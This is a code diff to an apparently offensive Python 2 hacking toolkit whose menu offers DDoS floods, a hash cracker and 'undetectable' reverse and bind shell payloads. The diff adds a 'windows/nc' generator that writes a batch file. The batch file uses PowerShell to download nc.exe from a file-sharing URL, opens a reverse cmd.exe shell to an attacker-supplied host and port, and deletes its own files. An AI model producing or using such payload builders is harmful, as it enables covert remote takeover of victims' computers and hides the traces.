@@ -13,14 +13,15 @@ except ImportError:
 	green=''
 	yellow=''
 	white=''
-scs = {'ddos':['flood/http','flood/tcp'],'bruteforce':['offline/hashkiller'],'payloads':['fud/python/reverse_shell','fud/python/bind_shell']}
+scs = {'ddos':['flood/http','flood/tcp'],'bruteforce':['offline/hashkiller'],'payloads':['fud/python/reverse_shell','fud/python/bind_shell','windows/nc']}
 opt1 = ''
 opt2 = ''
 infos = {'flood/http':
 	'Options:\nhost .... target to attack    '+opt1+'\nport .... port to target    '+opt2,'flood/tcp':
 	'Options:\nhost .... target to attack    '+opt1+'\nport .... port to target    '+opt2,'flood/udp':
 	'Options:\nhost .... target to attack    '+opt1+'\n','offline/hashkiller':'Options:\nhash .... hash to crack    '+opt1+'\nwordlist .... wordlist to use    '+opt2,
-	'fud/python/reverse_shell':'Options:\nhost .... host to reverse connect    '+opt1+'\nport .... port to reverse connect    '+opt2,'fud/python/bind_shell':'Options:\nhost .... host to bind    '+opt1+'\nport .... port to bind    '+opt2
+	'fud/python/reverse_shell':'Options:\nhost .... host to reverse connect    '+opt1+'\nport .... port to reverse connect    '+opt2,'fud/python/bind_shell':'Options:\nhost .... host to bind    '+opt1+'\nport .... port to bind    '+opt2,
+	'windows/nc':'Options\nhost .... host to reverse connect    '+opt1+'\nport .... port to reverse connect    '+opt2
 }
 def options(script,_opt1,_opt2):
 	global opt1
@@ -227,6 +228,27 @@ def fud_bindshell(lhost, lport): # bind shell (.py/.pyw)
 	_file.write('p="'+enc+'"\nexec(p.decode("base64"))')
 	_file.close()
 	print '%s[+]%s File saved as: %s\n' %(green,white,pth)
+def windows_nc(lhost, lport):
+	pth = raw_input('File name (ex: payload.bat): ')
+	payload = '''@echo off
+echo @echo off >> bd.bat
+echo powershell -Command "(New-Object Net.WebClient).DownloadFile('https://transfer.sh/pMOJi/nc.exe', '%temp%/nc.exe')" >>bd.bat
+echo cd %temp% >> bd.bat
+echo nc.exe '''+lhost+''' '''+lport+''' -e cmd.exe >>bd.bat
+echo del nc.exe >> bd.bat
+echo del bd.bat >> bd.bat
+echo exit >> bd.bat
+start /min bd.bat
+timeout 5 > nul
+del bd.bat'''
+	if os.path.isdir('output'):
+		pth = 'output/'+pth
+		_file = open(pth, 'w')
+	else:
+		_file = open(pth, 'w')
+	_file.write(payload)
+	_file.close()
+	print '%s[+]%s File saved as: %s\n' %(green,white,pth)
 def run(script, opt1, opt2):
 	if script == 'flood/http':
 		floodhttp(opt1,opt2)
@@ -243,3 +265,5 @@ def run(script, opt1, opt2):
 		fud_shell(opt1, opt2)
 	if script == 'fud/python/bind_shell':
 		fud_bindshell(opt1, opt2)
+	if script == 'windows/nc':
+		windows_nc(opt1, opt2)
